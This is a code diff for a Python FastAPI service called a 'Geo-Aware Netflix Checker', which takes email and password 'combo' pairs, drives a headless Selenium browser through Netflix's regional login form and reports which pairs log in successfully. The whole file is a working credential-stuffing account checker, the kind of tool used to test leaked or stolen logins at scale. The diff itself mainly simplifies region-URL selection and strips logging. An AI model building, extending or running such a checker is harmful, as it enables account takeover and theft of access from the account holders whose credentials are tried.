@@ -21,36 +21,26 @@ LOGIN_URL = "https://www.netflix.com/login"
 app = FastAPI(title="Geo-Aware Netflix Checker")
 
 
-# On startup, discover public IP + country + best-login URL
 @app.on_event("startup")
 def load_location():
     global PUBLIC_IP, GEO_COUNTRY, GEO_CODE, LOGIN_URL
-
-    # 1) Safe IP lookup
     try:
         PUBLIC_IP, GEO_COUNTRY, GEO_CODE = find_IP()
     except Exception as e:
         print(f"[startup] find_IP failed: {e!r}")
         PUBLIC_IP, GEO_COUNTRY, GEO_CODE = ("0.0.0.0", "Unknown", "US")
 
-    # 2) Safe region-URL check
+    # build default LOGIN_URL based on server region
     code      = GEO_CODE.lower()
-    candidate = f"https://www.netflix.com/{code}-en/login"
-    try:
-        resp = requests.get(candidate, timeout=5)
-        if 'name="userLoginId"' in resp.text:
-            LOGIN_URL = candidate
-    except Exception as e:
-        print(f"[startup] URL check failed: {e!r}")
-
-    print(f"[startup] Public IP: {PUBLIC_IP}, Country: {GEO_COUNTRY} ({GEO_CODE})")
+    LOGIN_URL = f"https://www.netflix.com/{code}-en/login"
+    print(f"[startup] Server IP: {PUBLIC_IP}, Region: {GEO_COUNTRY} ({GEO_CODE})")
     print(f"[startup] Default LOGIN_URL = {LOGIN_URL}")
 
 
 class Combo(BaseModel):
     email: str
     password: str
-    region: Optional[str] = None   # e.g. "PH", "US", etc.
+    region: Optional[str] = None  # override region code, e.g. "PH", "US"
 
 
 def make_driver():
@@ -74,26 +64,20 @@ def make_driver():
 @app.post("/check", summary="Headless Netflix login check")
 def check_combo(
     combo: Combo,
-    x_api_key: str = Header(..., alias="x-api-key"),
+    x_api_key: str = Header(..., alias="x-api-key")
 ):
     if x_api_key != API_KEY:
         raise HTTPException(401, "Invalid API key")
 
-    print(f"[check] Start for {combo.email}")
-
-    # Determine which login URL to use:
-    login_url = LOGIN_URL
+    # determine login_url
     if combo.region:
-        region_code = combo.region.upper()
-        candidate = f"https://www.netflix.com/{region_code.lower()}-en/login"
-        try:
-            r = requests.get(candidate, timeout=3)
-            if 'name="userLoginId"' in r.text:
-                login_url = candidate
-        except Exception:
-            pass
+        code = combo.region.strip().upper()
+        login_url = f"https://www.netflix.com/{code.lower()}-en/login"
+        print(f"[check] Region override: using {login_url}")
+    else:
+        login_url = LOGIN_URL
+        print(f"[check] Using default LOGIN_URL: {login_url}")
 
-    print(f"[check] Using LOGIN_URL = {login_url}")
     driver = make_driver()
     wait   = WebDriverWait(driver, 15)
 
@@ -106,51 +90,43 @@ def check_combo(
             print("[check] Page load timeout")
             raise HTTPException(504, "Netflix page load timeout")
 
-        # 2) Wait for login field
-        print("[check] Waiting for userLoginId")
+        # 2) Wait for login form
+        print("[check] Waiting for login form")
         wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))
 
         # 3) Dismiss cookie banner
         try:
-            print("[check] Dismiss cookie banner")
             btn = driver.find_element(By.ID, "onetrust-reject-all-handler")
             btn.click(); time.sleep(0.5)
         except NoSuchElementException:
-            print("[check] No cookie banner")
+            pass
 
-        # 4) Toggle PIN-first screen
+        # 4) PIN toggle
         try:
-            print("[check] Check PIN toggle")
             toggle = driver.find_element(
                 By.CSS_SELECTOR, "button[data-uia='login-toggle-button']"
             )
             if "Use password" in toggle.text:
                 toggle.click(); time.sleep(0.5)
-                print("[check] Toggled to password mode")
         except NoSuchElementException:
-            print("[check] No PIN-first screen")
+            pass
 
         # 5) Fill & submit
-        print("[check] Filling credentials")
         email_el = wait.until(EC.element_to_be_clickable((By.NAME, "userLoginId")))
         pwd_el   = driver.find_element(By.NAME, "password")
         email_el.clear(); email_el.send_keys(combo.email)
         pwd_el.clear();   pwd_el.send_keys(combo.password)
-        print("[check] Submitting form")
-        pwd_el.send_keys(u"\ue007")
+        pwd_el.send_keys(u"\ue007")  # ENTER
 
-        # 6) Wait for success or timeout
-        print("[check] Waiting for browse or profile gate")
+        # 6) Success check
         try:
             wait.until(lambda d:
-                d.current_url.startswith("https://www.netflix.com/browse")
-                or "profiles-gate-container" in d.page_source
+                d.current_url.startswith("https://www.netflix.com/browse") or
+                "profiles-gate-container" in d.page_source
             )
             success = True
-            print("[check] Login success")
         except TimeoutException:
             success = False
-            print("[check] Login failed or timed out")
 
         return {
             "ok": success,
@@ -162,4 +138,3 @@ def check_combo(
 
     finally:
         driver.quit()
-        print("[check] Browser closed")
